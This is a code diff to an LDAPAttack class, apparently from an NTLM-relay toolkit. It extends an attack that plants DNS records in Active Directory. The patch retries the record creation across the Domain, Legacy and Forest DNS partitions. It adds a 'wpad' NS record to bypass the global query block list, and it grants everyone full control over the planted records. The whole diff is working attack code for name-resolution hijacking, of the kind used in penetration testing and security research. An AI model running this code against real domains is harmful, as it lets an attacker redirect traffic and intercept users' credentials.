@@ -793,7 +793,7 @@ class LDAPAttack(ProtocolAttack):
                 name_array.append(len(data))
                 name_array.extend(data.encode("utf8"))
             return name_array
-
+ 
         def new_dns_record(data, type):
             if type == "A":
                 addr_data = data.split('.')
@@ -810,7 +810,7 @@ class LDAPAttack(ProtocolAttack):
                 dns_data.append(0)
             else:
                 return False
-
+ 
             dns_ttl = bytearray(reversed(int_to_4_bytes(60)))
             dns_record = bytearray(dns_length)
             dns_record.extend(dns_type)
@@ -820,73 +820,146 @@ class LDAPAttack(ProtocolAttack):
             dns_record.extend((0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00))
             dns_record.extend(dns_data)
             return dns_record
-
+ 
         def int_to_4_bytes(num):
             arr = bytearray()
             for i in range(4):
                 arr.append(num & 0xff)
                 num >>= 8
             return arr
-
+ 
         # https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py
         def get_next_serial(server, zone):
             dnsresolver = dns.resolver.Resolver()
             dnsresolver.nameservers = [server]
-            res = dnsresolver.resolve(zone, 'SOA',tcp=True)
+            res = dnsresolver.resolve(zone, 'SOA', tcp=True)
             for answer in res:
                 return answer.serial + 1
-
+ 
+        # ---------------------------------------------------------------
+        # Resolve naming contexts
+        # ---------------------------------------------------------------
         try:
-            dns_naming_context = next((nc for nc in self.client.server.info.naming_contexts if "domaindnszones" in nc.lower()))
+            dns_naming_context = next(
+                nc for nc in self.client.server.info.naming_contexts
+                if "domaindnszones" in nc.lower()
+            )
         except StopIteration:
-            LOG.error('Could not find DNS naming context, aborting')
+            LOG.error('Could not find DomainDnsZones naming context, aborting')
             return
-
+ 
+        # ForestDnsZones is optional – not every environment exposes it via
+        # the rootDSE naming contexts list, so we use None as sentinel.
+        forest_dns_naming_context = next(
+            (nc for nc in self.client.server.info.naming_contexts
+             if "forestdnszones" in nc.lower()),
+            None
+        )
+ 
         domaindn = self.client.server.info.other['defaultNamingContext'][0]
         domain = re.sub(',DC=', '.', domaindn[domaindn.find('DC='):], flags=re.I)[3:]
+ 
+        # ---------------------------------------------------------------
+        # Build base DNs for all three partitions
+        # ---------------------------------------------------------------
+        # 1) AD-Domain  – DomainDnsZones application partition (preferred)
         dns_base_dn = 'DC=%s,CN=MicrosoftDNS,%s' % (domain, dns_naming_context)
-
+        # 2) AD-Legacy  – CN=MicrosoftDNS,CN=System,<domainDN>
+        dns_base_dn_legacy = 'DC=%s,CN=MicrosoftDNS,CN=System,%s' % (domain, domaindn)
+        # 3) AD-Forest  – ForestDnsZones application partition (optional)
+        dns_base_dn_forest = (
+            'DC=%s,CN=MicrosoftDNS,%s' % (domain, forest_dns_naming_context)
+            if forest_dns_naming_context else None
+        )
+ 
         get_next_serial_p = partial(get_next_serial, self.client.server.address_info[0][4][0], domain)
-
+ 
+        # ---------------------------------------------------------------
+        # Check for pre-existing records across all three partitions
+        # ---------------------------------------------------------------
         LOG.info('Checking if domain already has a `%s` DNS record' % name)
         if self.client.search(dns_base_dn, '(name=%s)' % escape_filter_chars(name), search_scope=ldap3.LEVEL):
-            LOG.error('Domain already has a `%s` DNS record, aborting' % name)
+            LOG.error('Domain already has a `%s` DNS record in AD-Domain partition, aborting' % name)
             return
-
+        if self.client.search(dns_base_dn_legacy, '(name=%s)' % escape_filter_chars(name), search_scope=ldap3.LEVEL):
+            LOG.error('Domain already has a `%s` DNS record in AD-Legacy partition, aborting' % name)
+            return
+        if dns_base_dn_forest and self.client.search(dns_base_dn_forest, '(name=%s)' % escape_filter_chars(name), search_scope=ldap3.LEVEL):
+            LOG.error('Domain already has a `%s` DNS record in AD-Forest partition, aborting' % name)
+            return
+ 
         LOG.info('Domain does not have a `%s` record!' % name)
-
+ 
         ACL_ALLOW_EVERYONE_EVERYTHING = b'\x01\x00\x04\x9c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x000\x00\x02\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\n\x14\x00\x00\x00\x00\x10\x01\x01\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00'
-
+ 
         a_record_name = name
         is_name_wpad = (a_record_name.lower() == 'wpad')
-
+ 
         if is_name_wpad:
             LOG.info('To add the `wpad` name, we need to bypass the GQBL: we\'ll first add a random `A` name and then add `wpad` as `NS` pointing to that name')
             a_record_name = ''.join(random.choice(string.ascii_lowercase) for _ in range(12))
-
-        # First add an A record pointing to the provided IP
-        a_record_dn = 'DC=%s,%s' % (a_record_name, dns_base_dn)
-        a_record_data = {
-            'dnsRecord': new_dns_record(ipaddr, "A"),
-            'objectCategory': 'CN=Dns-Node,%s' % self.client.server.info.other['schemaNamingContext'][0],
-            'dNSTombstoned': False,
-            'name': a_record_name,
-            'nTSecurityDescriptor': ACL_ALLOW_EVERYONE_EVERYTHING,
-        }
-
-        LOG.info('Adding `A` record `%s` pointing to `%s` at `%s`' % (a_record_name, ipaddr, a_record_dn))
-        if not self.client.add(a_record_dn, ['top', 'dnsNode'], a_record_data):
-            LOG.error('Failed to add `A` record: %s' % str(self.client.result))
+ 
+        # ---------------------------------------------------------------
+        # Helper: try adding the A record to a specific base DN
+        # Returns True on success, False on failure.
+        # ---------------------------------------------------------------
+        def try_add_a_record(base_dn, partition_label):
+            nonlocal a_record_name
+            a_record_dn = 'DC=%s,%s' % (a_record_name, base_dn)
+            a_record_data = {
+                'dnsRecord': new_dns_record(ipaddr, "A"),
+                'objectCategory': 'CN=Dns-Node,%s' % self.client.server.info.other['schemaNamingContext'][0],
+                'dNSTombstoned': False,
+                'name': a_record_name,
+                'nTSecurityDescriptor': ACL_ALLOW_EVERYONE_EVERYTHING,
+            }
+            LOG.info('Adding `A` record `%s` pointing to `%s` at `%s` (%s)' % (
+                a_record_name, ipaddr, a_record_dn, partition_label))
+            if self.client.add(a_record_dn, ['top', 'dnsNode'], a_record_data):
+                return True
+            LOG.warning('Failed to add `A` record in %s: %s' % (partition_label, str(self.client.result)))
+            return False
+ 
+        # ---------------------------------------------------------------
+        # Try all three partitions in order
+        # ---------------------------------------------------------------
+        active_dns_base_dn = None
+ 
+        if try_add_a_record(dns_base_dn, 'AD-Domain partition (DomainDnsZones)'):
+            active_dns_base_dn = dns_base_dn
+        else:
+            LOG.info('Retrying with AD-Legacy partition (CN=MicrosoftDNS,CN=System,...)')
+            try:
+                if try_add_a_record(dns_base_dn_legacy, 'AD-Legacy partition'):
+                    active_dns_base_dn = dns_base_dn_legacy
+            except Exception as e:
+                LOG.warning('Exception while adding `A` record in AD-Legacy partition: %s' % str(e))
+ 
+        if active_dns_base_dn is None:
+            if dns_base_dn_forest:
+                LOG.info('Retrying with AD-Forest partition (ForestDnsZones)...')
+                try:
+                    if try_add_a_record(dns_base_dn_forest, 'AD-Forest partition (ForestDnsZones)'):
+                        active_dns_base_dn = dns_base_dn_forest
+                except Exception as e:
+                    LOG.warning('Exception while adding `A` record in AD-Forest partition: %s' % str(e))
+            else:
+                LOG.warning('AD-Forest partition (ForestDnsZones) not found in naming contexts, skipping')
+ 
+        if active_dns_base_dn is None:
+            LOG.error('Failed to add `A` record in all available partitions (Domain, Legacy, Forest), aborting')
             return
-
+ 
         LOG.info('Added `A` record `%s`. DON\'T FORGET TO CLEANUP (set `dNSTombstoned` to `TRUE`, set `dnsRecord` to a NULL byte)' % a_record_name)
-
+ 
         if not is_name_wpad:
             return
-
-        # Then add the wpad NS record
+ 
+        # ---------------------------------------------------------------
+        # Add NS record for wpad – use the same partition that worked above
+        # ---------------------------------------------------------------
         ns_record_name = 'wpad'
-        ns_record_dn = 'DC=%s,%s' % (ns_record_name, dns_base_dn)
+        ns_record_dn = 'DC=%s,%s' % (ns_record_name, active_dns_base_dn)
         ns_record_value = a_record_name + "." + domain
         ns_record_data = {
             'dnsRecord': new_dns_record(ns_record_value, "NS"),
@@ -895,12 +968,12 @@ class LDAPAttack(ProtocolAttack):
             'name': ns_record_name,
             'nTSecurityDescriptor': ACL_ALLOW_EVERYONE_EVERYTHING,
         }
-
+ 
         LOG.info('Adding `NS` record `%s` pointing to `%s` at `%s`' % (ns_record_name, ns_record_value, ns_record_dn))
         if not self.client.add(ns_record_dn, ['top', 'dnsNode'], ns_record_data):
             LOG.error('Failed to add `NS` record `wpad`: %s' % str(self.client.result))
             return
-
+ 
         LOG.info('Added `NS` record `%s`. DON\'T FORGET TO CLEANUP (set `dNSTombstoned` to `TRUE`, set `dnsRecord` to a NULL byte)' % ns_record_name)
 
 
